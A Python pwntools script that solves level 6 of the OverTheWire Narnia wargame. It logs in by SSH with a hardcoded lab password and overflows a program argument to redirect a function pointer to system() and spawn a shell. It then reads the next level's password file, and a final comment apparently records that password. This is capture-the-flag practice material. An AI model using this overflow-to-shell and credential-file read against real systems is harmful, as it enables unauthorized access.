import pwn
s=pwn.ssh(user='narnia6', password='neezocaeng', host='narnia.labs.overthewire.org', port=2226)
#the binary takes to arguments of length 8
#we overflow the first argument and point the function pointer to system
#and give it the argument 'sh' so we get a shell
sh=s.run(b'/narnia/narnia6 $(python -c \'print "sh;" + 5 * "A" + "\x50\xc8\xe4\xf7" + " BBBB"\')')
#using those permissions we can get the password for the next level!
sh.sendline(b'cat /etc/narnia_pass/narnia7')
flag=sh.recvline().decode('utf-8')[2:]
s.close()
pwn.log.info("Flag is: "+ flag)
#ahkiaziphu
